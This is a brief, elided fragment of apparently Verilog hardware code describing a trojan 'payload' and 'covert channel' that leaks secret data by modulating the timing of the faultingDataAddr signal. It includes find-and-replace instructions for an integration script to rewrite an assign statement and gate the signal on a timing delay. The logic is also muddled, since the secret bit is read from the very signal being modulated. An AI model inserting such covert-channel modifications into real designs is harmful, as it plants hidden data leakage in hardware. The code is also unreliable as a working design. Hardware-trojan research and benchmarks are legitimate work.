 ...
 * Payload: Modulate timing of faultingDataAddr based on secret data
 * 
...
assign secret_bit = faultingDataAddr[0];
...
// ============================================================
// Covert Channel: Modulate timing of faultingDataAddr
//
// Integration Script Must Modify:
//
// IF faultingDataAddr is timing-sensitive:
//   Find: assign faultingDataAddr = ready_signal;
//   Replace: assign faultingDataAddr = (timing_delay == 0) ? ready_signal : 1'b0;
//
